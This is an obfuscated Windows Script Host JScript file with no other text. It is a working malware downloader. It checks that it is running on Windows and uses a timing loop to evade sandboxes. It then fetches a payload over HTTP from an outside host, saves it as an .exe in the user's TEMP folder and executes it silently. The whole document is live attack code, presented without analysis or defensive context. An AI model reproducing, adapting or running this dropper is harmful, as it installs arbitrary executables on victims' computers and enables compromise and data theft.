var y1 = false;
var RF = "CreateObject";
var S = function fV() {return WScript[RF]("WScript.Shell");}(), XN = 11;
var oV = "MSXML2.XMLHTTP";
var s = 2123213;
var hD = 0;
function c(V){S["Run"](V, hD, hD);};
function g(){return "" + oV;};
function I(bi, Pv){hD = hD * 1; return bi - Pv;};
function nm(){return RF;};
/*@cc_on
  @if (@_win32 || @_win64)
    y1 = true;
  @end
@*/
if (y1)
{
var Mc = "";
function uH(){return 22;};
var sO = 0; var je = 0;
function OF()
{
var qh = new this["Date"]();
var yU = qh["getUTCMilliseconds"]();
WScript["Sleep"](uH());
var qh = new this["Date"]();
var y0 = qh["getUTCMilliseconds"]();
WScript["Sleep"](uH());
var qh = new this["Date"]();
var OQ = qh["getUTCMilliseconds"]();
var sO = "Fv";
sO = I(y0, yU);
var je = "Z";
je = I(OQ, y0);
Mc = "open";
return I(sO, je);
}
var v = false;
var uV = false;
for (var j = hD; j < uH() * 1; j++){if (OF() != hD){
v = true; 
je = "31" + 11 * sO + je; 
uV = true; 
break;
}}
function l() {return ((v == true) && (v == uV)) ? 1 : hD;};
if (v && l() && uV){
function E() {return S["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "XtBnJA7c9TC3.exe";};
 QU = g();
 l0 = WScript[RF](QU);
 var y = 1;
 while (y){
try {
l0[Mc]("GET", "http://digimacro.com.br/m8isda", false);
l0["send"]();
e = "Sleep";
for (;;){WScript[e](uH() * 11); if (l0["readystate"] >= 2 * 2) break;};
y = hD;
} catch(eq){};
}
function fK(RD) {var qf = (1, 2, 3, 4, 5, RD); return qf;};
MN = WScript[nm()]("ADODB.Stream");
QU = MN;
QU[Mc]();
QU["type"] = fK(1);
QU["write"](l0["ResponseBody"]);
MN["position"] = fK(hD);
QU["Save" + "ToFile"](E(), 2);
MN["c"+"lose"]();
OX = E();
c(OX);
}
}

